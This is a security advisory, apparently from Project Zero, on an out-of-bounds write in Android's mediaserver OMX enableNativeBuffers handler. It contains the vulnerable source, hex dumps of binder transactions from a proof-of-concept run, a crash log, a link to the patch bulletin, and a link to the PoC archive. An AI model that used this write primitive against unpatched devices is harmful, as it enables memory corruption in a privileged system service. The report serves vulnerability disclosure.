Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=932

The code in IOMXNodeInstance.cpp that handles enableNativeBuffers uses port_index without validation, leading to writing the dword value 0 or 1 at an attacker controlled offset from the IOMXNodeInstance structure.

The vulnerable code is here (every write to mSecureBufferType):

status_t OMXNodeInstance::enableNativeBuffers(
        OMX_U32 portIndex, OMX_BOOL graphic, OMX_BOOL enable) {
    Mutex::Autolock autoLock(mLock);
    CLOG_CONFIG(enableNativeBuffers, "%s:%u%s, %d", portString(portIndex), portIndex,
                graphic ? ", graphic" : "", enable);
    OMX_STRING name = const_cast<OMX_STRING>(
            graphic ? "OMX.google.android.index.enableAndroidNativeBuffers"
                    : "OMX.google.android.index.allocateNativeHandle");

    OMX_INDEXTYPE index;
    OMX_ERRORTYPE err = OMX_GetExtensionIndex(mHandle, name, &index);

    if (err == OMX_ErrorNone) {
        EnableAndroidNativeBuffersParams params;
        InitOMXParams(&params);
        params.nPortIndex = portIndex;
        params.enable = enable;

        err = OMX_SetParameter(mHandle, index, &params);
        CLOG_IF_ERROR(setParameter, err, "%s(%#x): %s:%u en=%d", name, index,
                      portString(portIndex), portIndex, enable);
        if (!graphic) {
            if (err == OMX_ErrorNone) {
                mSecureBufferType[portIndex] =
                    enable ? kSecureBufferTypeNativeHandle : kSecureBufferTypeOpaque;
            } else if (mSecureBufferType[portIndex] == kSecureBufferTypeUnknown) {
                mSecureBufferType[portIndex] = kSecureBufferTypeOpaque;
            }
        }
    } else {
        CLOG_ERROR_IF(enable, getExtensionIndex, err, "%s", name);
        if (!graphic) {
            // Extension not supported, check for manual override with system property
            // This is a temporary workaround until partners support the OMX extension
            char value[PROPERTY_VALUE_MAX];
            if (property_get("media.mediadrmservice.enable", value, NULL)
                && (!strcmp("1", value) || !strcasecmp("true", value))) {
                CLOG_CONFIG(enableNativeBuffers, "system property override: using native-handles");
                mSecureBufferType[portIndex] = kSecureBufferTypeNativeHandle;
            } else if (mSecureBufferType[portIndex] == kSecureBufferTypeUnknown) {
                mSecureBufferType[portIndex] = kSecureBufferTypeOpaque;
            }
            err = OMX_ErrorNone;
        }
    }

    return StatusFromOMXError(err);
}

This code is reached from the binder interface android.hardware.IOMX in the mediaserver process; via the following code in IOMX.cpp which reads the port_index directly from the incoming parcel without any validation.

       case ENABLE_NATIVE_BUFFERS:
        {
            CHECK_OMX_INTERFACE(IOMX, data, reply);

            node_id node = (node_id)data.readInt32();
            OMX_U32 port_index = data.readInt32();
            OMX_BOOL graphic = (OMX_BOOL)data.readInt32();
            OMX_BOOL enable = (OMX_BOOL)data.readInt32();

            status_t err = enableNativeBuffers(node, port_index, graphic, enable);
            reply->writeInt32(err);

            return NO_ERROR;
        }

Running the attached proof-of-concept on a Nexus 5x yields the following output:

--- binder OMX index-out-of-bounds ---
[0] opening /dev/binder
[0] looking up media.player
0000: 00 . 01 . 00 . 00 . 1a . 00 . 00 . 00 . 61 a 00 . 6e n 00 . 64 d 00 . 72 r 00 .
0016: 6f o 00 . 69 i 00 . 64 d 00 . 2e . 00 . 6f o 00 . 73 s 00 . 2e . 00 . 49 I 00 .
0032: 53 S 00 . 65 e 00 . 72 r 00 . 76 v 00 . 69 i 00 . 63 c 00 . 65 e 00 . 4d M 00 .
0048: 61 a 00 . 6e n 00 . 61 a 00 . 67 g 00 . 65 e 00 . 72 r 00 . 00 . 00 . 00 . 00 .
0064: 0c . 00 . 00 . 00 . 6d m 00 . 65 e 00 . 64 d 00 . 69 i 00 . 61 a 00 . 2e . 00 .
0080: 70 p 00 . 6c l 00 . 61 a 00 . 79 y 00 . 65 e 00 . 72 r 00 . 00 . 00 . 00 . 00 .
BR_NOOP:
BR_TRANSACTION_COMPLETE:
BR_REPLY:
  target 0000000000000000  cookie 0000000000000000  code 00000000  flags 00000000
  pid        0  uid     1000  data 24  offs 8
0000: 85 . 2a * 68 h 73 s 7f . 01 . 00 . 00 . 01 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
0016: 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
  - type 73682a85  flags 0000017f  ptr 0000000000000001  cookie 0000000000000000
[0] got handle 00000001
[0] creating an OMX
0000: 00 . 01 . 00 . 00 . 21 ! 00 . 00 . 00 . 61 a 00 . 6e n 00 . 64 d 00 . 72 r 00 .
0016: 6f o 00 . 69 i 00 . 64 d 00 . 2e . 00 . 6d m 00 . 65 e 00 . 64 d 00 . 69 i 00 .
0032: 61 a 00 . 2e . 00 . 49 I 00 . 4d M 00 . 65 e 00 . 64 d 00 . 69 i 00 . 61 a 00 .
0048: 50 P 00 . 6c l 00 . 61 a 00 . 79 y 00 . 65 e 00 . 72 r 00 . 53 S 00 . 65 e 00 .
0064: 72 r 00 . 76 v 00 . 69 i 00 . 63 c 00 . 65 e 00 . 00 . 00 .
BR_NOOP:
BR_TRANSACTION_COMPLETE:
BR_REPLY:
  target 0000000000000000  cookie 0000000000000000  code 00000000  flags 00000000
  pid        0  uid     1013  data 24  offs 8
0000: 85 . 2a * 68 h 73 s 7f . 01 . 00 . 00 . 02 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
0016: 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
  - type 73682a85  flags 0000017f  ptr 0000000000000002  cookie 0000000000000000
[0] got handle 00000002
[0] creating node
0000: 00 . 01 . 00 . 00 . 15 . 00 . 00 . 00 . 61 a 00 . 6e n 00 . 64 d 00 . 72 r 00 .
0016: 6f o 00 . 69 i 00 . 64 d 00 . 2e . 00 . 68 h 00 . 61 a 00 . 72 r 00 . 64 d 00 .
0032: 77 w 00 . 61 a 00 . 72 r 00 . 65 e 00 . 2e . 00 . 49 I 00 . 4f O 00 . 4d M 00 .
0048: 58 X 00 . 00 . 00 . 4f O 4d M 58 X 2e . 67 g 6f o 6f o 67 g 6c l 65 e 2e . 67 g
0064: 73 s 6d m 2e . 64 d 65 e 63 c 6f o 64 d 65 e 72 r 00 . 00 . 85 . 2a * 62 b 73 s
0080: 7f . 01 . 00 . 00 . 41 A 41 A 41 A 41 A 00 . 00 . 00 . 00 . 00 . 00 . 00 . 00 .
0096: 00 . 00 . 00 . 00 .
BR_NOOP:
BR_INCREFS:
  0x7fe5862df8, 0x7fe5862e00
BR_ACQUIRE:
  0x7fe5862e0c, 0x7fe5862e14
BR_TRANSACTION_COMPLETE:
BR_NOOP:
BR_REPLY:
  target 0000000000000000  cookie 0000000000000000  code 00000000  flags 00000000
  pid        0  uid     1013  data 8  offs 0
0000: 00 . 00 . 00 . 00 . 03 . 00 . 1e . 1d .
[0] got node 1d1e0003
[0] triggering bug
0000: 00 . 01 . 00 . 00 . 15 . 00 . 00 . 00 . 61 a 00 . 6e n 00 . 64 d 00 . 72 r 00 .
0016: 6f o 00 . 69 i 00 . 64 d 00 . 2e . 00 . 68 h 00 . 61 a 00 . 72 r 00 . 64 d 00 .
0032: 77 w 00 . 61 a 00 . 72 r 00 . 65 e 00 . 2e . 00 . 49 I 00 . 4f O 00 . 4d M 00 .
0048: 58 X 00 . 00 . 00 . 03 . 00 . 1e . 1d . ba . 43 C 46 F 60 ` 00 . 00 . 00 . 00 .
0064: 00 . 00 . 00 . 00 .
BR_NOOP:
BR_TRANSACTION_COMPLETE:
BR_NOOP:
BR_DEAD_REPLY:

And a corresponding crash in the mediaserver process:

*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'google/bullhead/bullhead:7.0/NRD91E/3234993:userdebug/dev-keys'
Revision: 'rev_1.0'
ABI: 'arm'
pid: 7454, tid: 7457, name: Binder:7454_1  >>> /system/bin/mediaserver <<<
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x6a9e0014
    r0 6a9dffa8  r1 ea8e757c  r2 ea43aa1a  r3 0000000f
    r4 e984f0c0  r5 8000101a  r6 00000000  r7 ea43a981
    r8 604643ba  r9 00000000  sl ea451f61  fp 00000000
    ip ea012658  sp e81d5660  lr e9faa527  pc ea42d834  cpsr 60030030

backtrace:
    #00 pc 0001c834  /system/lib/libstagefright_omx.so (_ZN7android15OMXNodeInstance19enableNativeBuffersEj8OMX_BOOLS1_+131)
    #01 pc 0009b8fb  /system/lib/libmedia.so (_ZN7android5BnOMX10onTransactEjRKNS_6ParcelEPS1_j+3626)
    #02 pc 000359c3  /system/lib/libbinder.so (_ZN7android7BBinder8transactEjRKNS_6ParcelEPS1_j+70)
    #03 pc 0003d1bb  /system/lib/libbinder.so (_ZN7android14IPCThreadState14executeCommandEi+702)
    #04 pc 0003ce07  /system/lib/libbinder.so (_ZN7android14IPCThreadState20getAndExecuteCommandEv+114)
    #05 pc 0003d31b  /system/lib/libbinder.so (_ZN7android14IPCThreadState14joinThreadPoolEb+46)
    #06 pc 0004f765  /system/lib/libbinder.so
    #07 pc 0000e349  /system/lib/libutils.so (_ZN7android6Thread11_threadLoopEPv+140)
    #08 pc 00047003  /system/lib/libc.so (_ZL15__pthread_startPv+22)
    #09 pc 00019e1d  /system/lib/libc.so (__start_thread+6)

Fixed in the November security bulletin at https://source.android.com/security/bulletin/2016-11-01.html


Proof of Concept:
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40876.zip